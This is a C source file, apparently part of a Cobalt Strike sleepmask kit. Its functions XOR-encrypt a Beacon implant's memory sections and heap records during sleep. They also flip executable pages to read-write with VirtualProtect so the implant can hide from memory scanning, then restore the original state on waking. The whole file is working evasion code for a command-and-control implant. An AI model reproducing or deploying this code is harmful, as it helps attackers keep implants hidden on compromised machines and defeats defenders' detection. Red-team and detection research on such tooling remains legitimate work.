#include <windows.h>

#include "../beacon.h"
#include "../base/helpers.h"
#include "../debug.h"
#include "../sleepmask.h"
#include "../sleepmask-vs.h"

/**
* Mask Beacon
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void MaskBeacon(BEACON_INFO* beaconInfo) {
    XORBeacon(beaconInfo, TRUE);

    return;
}

/**
* UnMask Beacon
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void UnMaskBeacon(BEACON_INFO* beaconInfo) {
    XORBeacon(beaconInfo, FALSE);
    
    return;
}

/**
* XOR Beacon's Sections/Heap Records
*
* @param beaconInfo A pointer to the BEACON_INFO structure
* @param mask A Boolean value to indicate whether to mask/unmask Beacon
*/
void XORBeacon(BEACON_INFO* beaconInfo, BOOL mask) {
    // Determine which allocated memory region contains Beacon
    PALLOCATED_MEMORY_REGION beaconMemory = FindRegionByPurpose(&beaconInfo->allocatedMemory, PURPOSE_BEACON_MEMORY);
    if (beaconMemory == NULL) {
        DLOGF("SLEEPMASK: Failed to find Beacon memory. Exiting...\n");
        return;
    }

    // Mask/UnMask the memory
    XORSections(beaconMemory, beaconInfo->mask, mask);
    XORHeapRecords(beaconInfo);

    return;
}

/**
* XOR the sections in the provided memory region
* 
* @param allocatedRegion A pointer to a ALLOCATED_MEMORY_REGION structure
* @param maskKey A pointer to the mask key
* @param mask A Boolean value to indicate whether the function is masking/unmasking
*/
void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
    DFR_LOCAL(KERNEL32, VirtualProtect);
    for (int i = 0; i < sizeof(allocatedRegion->Sections) / sizeof(ALLOCATED_MEMORY_SECTION); i++) {
        // Check we have a valid base address
        char* baseAddress = (char*)allocatedRegion->Sections[i].BaseAddress;
        if (baseAddress == NULL) {
            // Keep searching for a valid section
            continue;
        }
        DLOGF("SLEEPMASK: %s Section - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
        if (allocatedRegion->Sections[i].MaskSection == TRUE) {
            // Change protections on any RX regions if masking
            if (allocatedRegion->Sections[i].CurrentProtect == PAGE_EXECUTE_READ && mask == TRUE) {
                VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, PAGE_READWRITE, &allocatedRegion->Sections[i].PreviousProtect);
                allocatedRegion->Sections[i].CurrentProtect = PAGE_READWRITE;
            }

            // Mask the section
            XORData((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);

            // Restore original protections when unmasking
            if (allocatedRegion->Sections[i].PreviousProtect != allocatedRegion->Sections[i].CurrentProtect && mask == FALSE) {
                allocatedRegion->Sections[i].CurrentProtect = allocatedRegion->Sections[i].PreviousProtect;
                VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &allocatedRegion->Sections[i].PreviousProtect);
                
            }
        }
    }
        
    return;
}

/**
* XOR Heap Records
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void XORHeapRecords(BEACON_INFO* beaconInfo) {
    DWORD heapRecord = 0;
    while (beaconInfo->heap_records[heapRecord].ptr != NULL) {
        XORData(beaconInfo->heap_records[heapRecord].ptr, beaconInfo->heap_records[heapRecord].size, beaconInfo->mask, MASK_SIZE);
        heapRecord++;
    }

    return;
}

/**
* XOR the provided buffer with the provided key
*
* @param buffer The buffer to XOR
* @param size The size of the buffer
* @param key The key to XOR the buffer
* @param keyLength The size of the XOR key
* @return A Boolean value to indicate success
*/
BOOL XORData(char* buffer, size_t size, char* key, size_t keyLength) {
    if (buffer == NULL || key == NULL || keyLength == 0) {
        return FALSE;
    }

    for (size_t index = 0; index < size; index++) {
        buffer[index] ^= key[index % keyLength];
    }
    return TRUE;
}
